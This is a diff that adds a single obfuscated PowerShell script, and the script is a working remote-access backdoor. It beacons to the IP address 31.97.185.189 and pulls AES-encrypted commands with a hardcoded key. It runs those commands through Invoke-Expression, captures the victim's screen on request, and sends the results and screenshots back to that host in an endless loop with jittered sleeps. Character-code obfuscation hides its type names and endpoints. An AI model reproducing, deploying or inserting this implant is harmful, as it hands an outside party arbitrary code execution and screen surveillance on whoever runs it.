@@ -1,0 +1,14 @@
+﻿$URL="http://31.97.185.189"
+$_____=[System.Text.Encoding]::UTF8
+$______=(-join (@(49,50,51,52,53,54,55,56,57,48,49,50,51,52,53,54)|%{[char]$_}))
+$_______=$_____.GetBytes($______)
+$________=$_____.GetBytes($______)
+$_________=New-Object -TypeName "$(-join (@(83,121,115,116,101,109)|%{[char]$_})).$(-join (@(83,101,99,117,114,105,116,121)|%{[char]$_})).$(-join (@(67,114,121,112,116,111,103,114,97,112,104,121)|%{[char]$_})).$(-join (@(65,101,115,77,97,110,97,103,101,100)|%{[char]$_}))"
+$_________.Key=$_______
+$_________.IV=$________
+$_________.Mode=[System.Security.Cryptography.CipherMode]::CBC
+$_________.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
+${-}={param($a);$b=$_________.CreateDecryptor();$c=[System.Convert]::FromBase64String($a);$d=$b.TransformFinalBlock($c,0,$c.Length);return $_____.GetString($d)}
+${--}={param($e);$f=$_________.CreateEncryptor();$g=$_____.GetBytes($e);$h=$f.TransformFinalBlock($g,0,$g.Length);return [System.Convert]::ToBase64String($h)}
+${---}={Add-Type -AssemblyName "$(-join (@(83,121,115,116,101,109)|%{[char]$_})).$(-join (@(87,105,110,100,111,119,115)|%{[char]$_})).$(-join (@(70,111,114,109,115)|%{[char]$_}))"|Out-Null;$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object -TypeName "$(-join (@(83,121,115,116,101,109)|%{[char]$_})).$(-join (@(68,114,97,119,105,110,103)|%{[char]$_})).$(-join (@(66,105,116,109,97,112)|%{[char]$_}))" -ArgumentList $s.Width,$s.Height;$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);$m=New-Object -TypeName "$(-join (@(83,121,115,116,101,109)|%{[char]$_})).$(-join (@(73,79)|%{[char]$_})).$(-join (@(77,101,109,111,114,121,83,116,114,101,97,109)|%{[char]$_}))";$b.Save($m,[System.Drawing.Imaging.ImageFormat]::Png);$r=$m.ToArray();$m.Close();return [System.Convert]::ToBase64String($r)}
+while($true){try{$i=Invoke-RestMethod -Uri "$URL/$(-join(@(116,97,115,107,115)|%{[char]$_}))" -Method Get -ErrorAction Stop;$j=(&${-} $i);if($j -ne (-join(@(73,68,76,69)|%{[char]$_}))){if($j -eq (-join(@(83,67,82,69,69,78)|%{[char]$_}))){$s=&${---};Invoke-RestMethod -Uri "$URL/$(-join(@(115,99,114,101,101,110)|%{[char]$_}))" -Method Post -Body $s -ContentType (-join(@(116,101,120,116,47,112,108,97,105,110)|%{[char]$_})) -ErrorAction Stop}else{$k=Invoke-Expression $j|Out-String;if([string]::IsNullOrWhiteSpace($k)){$k="[OK]"};$l=(&${--} $k);Invoke-RestMethod -Uri "$URL/$(-join(@(114,101,115,117,108,116,115)|%{[char]$_}))" -Method Post -Body $l -ContentType (-join(@(116,101,120,116,47,112,108,97,105,110)|%{[char]$_})) -ErrorAction Stop}}}catch{};Start-Sleep -Seconds (5+(Get-Random -Minimum -1 -Maximum 2))}
